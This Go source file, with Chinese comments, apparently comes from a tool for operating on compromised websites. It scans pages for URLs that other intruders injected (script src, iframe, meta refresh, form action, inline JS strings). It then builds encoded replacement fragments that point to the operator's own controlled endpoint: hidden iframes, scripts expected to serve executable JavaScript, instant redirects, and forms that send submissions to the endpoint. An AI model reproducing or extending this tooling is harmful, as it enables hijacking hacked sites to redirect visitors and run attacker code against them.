package redirect

import (
	"regexp"
	"strings"

	"golang.org/x/net/html"
)

// 注入點偵測：找出頁面裡「他們塞的」外部網址。
//
// 為什麼需要這個：
//   受控站（被入侵的網站）把回連網址塞進頁面的方式是固定的幾種 ——
//   <script src>、<iframe src>、<meta refresh>、<link href>，或是直接寫在
//   inline <script> 的字串裡（例如 `location.href='https://evil.tld/x'`）。
//   要把「他們注入的」換成「我們的」，第一步就是**自動把這些位置找出來**；
//   只靠人工翻原始碼會漏，而且站一多就做不完。
//
// 這裡只做「偵測與定位」，不改動目標站 —— 實際植入是另一個動作
// （BuildPointImplant 產生替換片段）。

const (
	// InjectionKindScriptSrc 是 <script src="外部網址">。
	InjectionKindScriptSrc = "script_src"
	// InjectionKindIframeSrc 是 <iframe src="外部網址">。
	InjectionKindIframeSrc = "iframe_src"
	// InjectionKindMetaRefresh 是 <meta http-equiv="refresh" content="0;url=外部網址">。
	InjectionKindMetaRefresh = "meta_refresh"
	// InjectionKindJSString 是 inline <script> 裡的字串網址。
	InjectionKindJSString = "js_string"
	// InjectionKindLinkHref 是 <link href="外部網址">（樣式表／預載）。
	InjectionKindLinkHref = "link_href"
	// InjectionKindFormAction 是 <form action="外部網址">。
	InjectionKindFormAction = "form_action"
)

// InjectionPoint 是頁面裡找到的一個注入位置。
type InjectionPoint struct {
	// Kind 是型態（見上面的 InjectionKind 常數）。
	Kind string `json:"kind"`
	// Tag / Attr 是原始標籤與屬性（例如 tag=script attr=src）。
	Tag  string `json:"tag"`
	Attr string `json:"attr"`
	// URL 是「他們塞的」那個網址。
	URL string `json:"url"`
	// Context 是原始碼片段（截斷到 160 字），讓人一眼看出注入長什麼樣。
	Context string `json:"context"`
	// Page 是發現這個注入點的頁面網址。
	Page string `json:"page"`
	// SelfHost 為 true 表示指向站方自己的資源（不是第三方注入）。
	SelfHost bool `json:"self_host"`
}

// InjectionScanOptions 是掃描選項。
type InjectionScanOptions struct {
	// SelfHost 是站方自己的主機（比對用；空 = 用 pageURL 的主機）。
	SelfHost string
	// IgnoreHosts 是要忽略的主機（例如我們自己的受控端點 —— 不要把
	// 我們自己植入的東西回報成「他們注入的」）。
	IgnoreHosts []string
	// MaxPoints 是最多回報幾個注入點（<=0 = DefaultMaxInjectionPoints）。
	MaxPoints int
}

// DefaultMaxInjectionPoints 是單頁最多回報的注入點數。
const DefaultMaxInjectionPoints = 40

// jsURLPattern 找 inline <script> 裡的絕對網址。
//
// 排除常見的尾端符號（引號、分號、括號、逗號），避免把
// `location.href='https://x.tld/a');` 的括號一起帶走。
var jsURLPattern = regexp.MustCompile(`https?://[^\s'"<>\\)\];,]+`)

// ScanInjections 掃描一份 HTML，找頁面裡的注入點。
//
// 只回報「外部」資源（指向別的主機）；指向自己的保留但標 SelfHost=true，
// 讓呼叫端自行決定要不要看。
func ScanInjections(pageURL string, body []byte, opts InjectionScanOptions) []InjectionPoint {
	maxPoints := opts.MaxPoints
	if maxPoints <= 0 {
		maxPoints = DefaultMaxInjectionPoints
	}
	selfHost := strings.ToLower(strings.TrimSpace(opts.SelfHost))
	if selfHost == "" {
		selfHost = hostOf(pageURL)
	}
	ignore := make(map[string]bool, len(opts.IgnoreHosts))
	for _, h := range opts.IgnoreHosts {
		h = strings.ToLower(strings.TrimSpace(h))
		if h != "" {
			ignore[h] = true
		}
	}

	points := make([]InjectionPoint, 0, 8)
	seen := map[string]bool{}

	add := func(kind, tag, attr, rawURL, context string) {
		rawURL = strings.TrimSpace(strings.Trim(strings.TrimSpace(rawURL), `"'`))
		if rawURL == "" || !strings.HasPrefix(rawURL, "http://") && !strings.HasPrefix(rawURL, "https://") {
			return
		}
		host := strings.ToLower(hostOf(rawURL))
		if host == "" || ignore[host] {
			return
		}
		key := kind + "|" + rawURL
		if seen[key] {
			return
		}
		seen[key] = true
		points = append(points, InjectionPoint{
			Kind:     kind,
			Tag:      tag,
			Attr:     attr,
			URL:      rawURL,
			Context:  truncateContext(context),
			Page:     pageURL,
			SelfHost: host != "" && host == selfHost,
		})
	}

	tokenizer := html.NewTokenizer(strings.NewReader(string(body)))
	for {
		tt := tokenizer.Next()
		if tt == html.ErrorToken {
			break
		}
		if tt == html.StartTagToken || tt == html.SelfClosingTagToken {
			name, hasAttr := tokenizer.TagName()
			tag := strings.ToLower(string(name))
			// 一定要先 make：nil map 賦值會 panic（整個巡站直接崩）。
			attrs := make(map[string]string)
			for hasAttr {
				key, val, more := tokenizer.TagAttr()
				hasAttr = more
				attrs[strings.ToLower(string(key))] = string(val)
			}
			switch tag {
			case "script":
				if src, ok := attrs["src"]; ok && src != "" {
					add(InjectionKindScriptSrc, "script", "src", src, "<script src=\""+src+"\">")
				}
			case "iframe":
				if src, ok := attrs["src"]; ok && src != "" {
					add(InjectionKindIframeSrc, "iframe", "src", src, "<iframe src=\""+src+"\">")
				}
			case "link":
				if href, ok := attrs["href"]; ok && href != "" {
					add(InjectionKindLinkHref, "link", "href", href, "<link href=\""+href+"\">")
				}
			case "form":
				if action, ok := attrs["action"]; ok && action != "" {
					add(InjectionKindFormAction, "form", "action", action, "<form action=\""+action+"\">")
				}
			case "meta":
				equiv := strings.ToLower(strings.TrimSpace(attrs["http-equiv"]))
				if equiv == "refresh" {
					content := attrs["content"]
					if u := metaRefreshURL(content); u != "" {
						add(InjectionKindMetaRefresh, "meta", "content", u, "<meta http-equiv=\"refresh\" content=\""+content+"\">")
					}
				}
			}
			continue
		}
		if tt == html.TextToken {
			// inline <script> 的內容
			text := string(tokenizer.Text())
			if !strings.Contains(text, "http://") && !strings.Contains(text, "https://") {
				continue
			}
			for _, m := range jsURLPattern.FindAllString(text, -1) {
				add(InjectionKindJSString, "script", "text", m, excerptAround(text, m, 60))
			}
		}
	}

	if len(points) > maxPoints {
		points = points[:maxPoints]
	}
	return points
}

// metaRefreshURL 從 meta refresh 的 content 取出目標網址。
//
// content 形如 "0;url=https://x.tld/a" 或 "5"（沒有網址）。
func metaRefreshURL(content string) string {
	value := strings.TrimSpace(content)
	if value == "" {
		return ""
	}
	lower := strings.ToLower(value)
	idx := strings.Index(lower, "url=")
	if idx < 0 {
		return ""
	}
	return strings.TrimSpace(value[idx+4:])
}

// excerptAround 取 m 周圍的片段當上下文。
func excerptAround(text string, m string, width int) string {
	idx := strings.Index(text, m)
	if idx < 0 {
		return truncateContext(m)
	}
	start := idx - width
	if start < 0 {
		start = 0
	}
	end := idx + len(m) + width
	if end > len(text) {
		end = len(text)
	}
	return truncateContext(strings.TrimSpace(text[start:end]))
}

// truncateContext 把上下文截到 160 字。
func truncateContext(s string) string {
	s = strings.TrimSpace(s)
	const limit = 160
	if len([]rune(s)) <= limit {
		return s
	}
	return string([]rune(s)[:limit]) + "…"
}

// EndpointHost 取出端點的主機名（忽略埠號）。
//
// 偵測注入點時要拿它比對「這是不是我們自己的端點」——我們自己植入的片段
// 必須被排除，不能被回報成「他們注入的」，否則自動植入會拿自己替換自己。
func EndpointHost(raw string) string {
	return hostOf(raw)
}

// InjectionKinds 回傳所有可偵測的注入型態。
//
// 前端用這份清單決定要顯示哪幾種「替換片段」選項。
func InjectionKinds() []string {
	return []string{
		InjectionKindScriptSrc,
		InjectionKindIframeSrc,
		InjectionKindMetaRefresh,
		InjectionKindJSString,
		InjectionKindLinkHref,
		InjectionKindFormAction,
	}
}

// InjectionEncodingMatrix 回傳「注入型態 × 可行編碼」的完整矩陣。
//
// 這是前端唯一的能力來源：不相容的組合前端直接停用，不讓使用者送出
// 注定失敗的請求。規則只存在這裡一份。
func InjectionEncodingMatrix() map[string][]string {
	matrix := make(map[string][]string, len(InjectionKinds()))
	for _, kind := range InjectionKinds() {
		matrix[kind] = ImplantEncodingsForPointKind(kind)
	}
	return matrix
}

// ImplantEncodingsForPointKind 回傳「注入點型態 × 可行的編碼」。
//
// 判斷依據是「誰在讀這個字串」：
//   - script/iframe/link/form 的屬性：瀏覽器把整個字串當 URL 解析 → 只接受 URL 層級編碼。
//   - meta refresh：瀏覽器把 url= 的值當 URL 解析 → 只接受 URL 層級編碼。
//   - inline JS 字串：JS 字串常值 → 可以是跳脫形式，也可以自帶解碼器 → 全部接受。
func ImplantEncodingsForPointKind(kind string) []string {
	switch strings.ToLower(strings.TrimSpace(kind)) {
	case InjectionKindJSString:
		return PayloadEncodings()
	default:
		return []string{PayloadEncodingNone, PayloadEncodingPercent, PayloadEncodingDoublePercent}
	}
}

// PointImplantOptions 是「替換某個注入點」的參數。
type PointImplantOptions struct {
	// Point 是要替換的注入點。
	Point InjectionPoint
	// Endpoint 是我們的受控端點。
	Endpoint string
	// Encoding 是寫入時的編碼方式。
	Encoding string
	// Param 是 url_param 型態用的參數名。
	Param string
}

// PointImplantResult 是替換片段。
type PointImplantResult struct {
	// Point 是原始注入點。
	Point InjectionPoint `json:"point"`
	// Kind 是我們產生的片段型態（對應原注入點的型態）。
	Kind string `json:"kind"`
	// Original 是「他們塞的」網址。
	Original string `json:"original"`
	// Payload 是實際寫進去的字串（可能已編碼）。
	Payload string `json:"payload"`
	// Fragment 是可以直接貼進頁面的完整片段。
	Fragment string `json:"fragment"`
	// Note 是給操作者的說明。
	Note string `json:"note"`
}

// BuildPointImplant 產生「把『他們注入的』換成『我們的』」的片段。
//
// 這是「他們注入的能不能換成我們的 URL 然後 URL 加密植入」的直接實作：
// 輸入一個偵測到的注入點與我們的受控端點，輸出可直接貼用的替換片段。
func BuildPointImplant(opts PointImplantOptions) (PointImplantResult, error) {
	endpoint := strings.TrimSpace(opts.Endpoint)
	if endpoint == "" {
		return PointImplantResult{}, errEmptyEndpoint
	}
	kind := strings.ToLower(strings.TrimSpace(opts.Point.Kind))
	if kind == "" {
		return PointImplantResult{}, errEmptyPointKind
	}
	encoding, err := NormalizePayloadEncoding(opts.Encoding)
	if err != nil {
		return PointImplantResult{}, err
	}
	allowed := ImplantEncodingsForPointKind(kind)
	ok := false
	for _, candidate := range allowed {
		if candidate == encoding {
			ok = true
			break
		}
	}
	if !ok {
		return PointImplantResult{}, &implantEncodingError{kind: kind, encoding: encoding, allowed: allowed}
	}

	payload, err := EncodeEndpoint(endpoint, encoding)
	if err != nil {
		return PointImplantResult{}, err
	}

	result := PointImplantResult{
		Point:    opts.Point,
		Kind:     kind,
		Original: opts.Point.URL,
		Payload:  payload,
	}

	switch kind {
	case InjectionKindScriptSrc:
		result.Fragment = "<script src=\"" + payload + "\"></script>"
		result.Note = "取代原本的 <script src>；受控端點需能回應可執行的 JavaScript。"
	case InjectionKindIframeSrc:
		result.Fragment = "<iframe src=\"" + payload + "\" style=\"display:none\"></iframe>"
		result.Note = "取代原本的 <iframe src>；訪客不會看到外框，但請求會出去。"
	case InjectionKindMetaRefresh:
		result.Fragment = "<meta http-equiv=\"refresh\" content=\"0;url=" + payload + "\">"
		result.Note = "取代原本的 meta refresh；訪客會被直接帶走。"
	case InjectionKindLinkHref:
		result.Fragment = "<a href=\"" + payload + "\">"
		result.Note = "取代原本的 <link href>（樣式表／預載）；改成 <a> 才會導向。"
	case InjectionKindFormAction:
		result.Fragment = "<form action=\"" + payload + "\">"
		result.Note = "取代原本的 <form action>；送出表單會導向受控端點。"
	case InjectionKindJSString:
		// inline <script> 裡的字串是 JS 字串常值，可以是跳脫形式，也可以自帶解碼器。
		jsImplant, jsErr := BuildImplant(ImplantOptions{
			Endpoint: endpoint,
			Encoding: encoding,
			Kind:     ImplantKindJSRedirect,
		})
		if jsErr != nil {
			return PointImplantResult{}, jsErr
		}
		result.Fragment = jsImplant.Fragment
		result.Note = "取代 inline <script> 裡的字串網址；這是 JS 字串常值，可以是跳脫或自帶解碼器。"
	default:
		return PointImplantResult{}, errUnknownPointKind
	}
	return result, nil
}

// implantEncodingError 是「編碼對這個型態沒有意義」的錯誤。
type implantEncodingError struct {
	kind     string
	encoding string
	allowed  []string
}

func (e *implantEncodingError) Error() string {
	return "注入型態 " + e.kind + " 不支援編碼 " + e.encoding +
		"（這個型態只支援：" + strings.Join(e.allowed, "、") + "）"
}

// errEmptyEndpoint / errUnknownPointKind / errEmptyPointKind 是固定錯誤。
var (
	errEmptyEndpoint    = &pointError{"受控端點為空"}
	errEmptyPointKind   = &pointError{"注入型態為空"}
	errUnknownPointKind = &pointError{"不支援的注入型態"}
)

// pointError 是固定錯誤型別。
type pointError struct{ msg string }

func (e *pointError) Error() string { return e.msg }
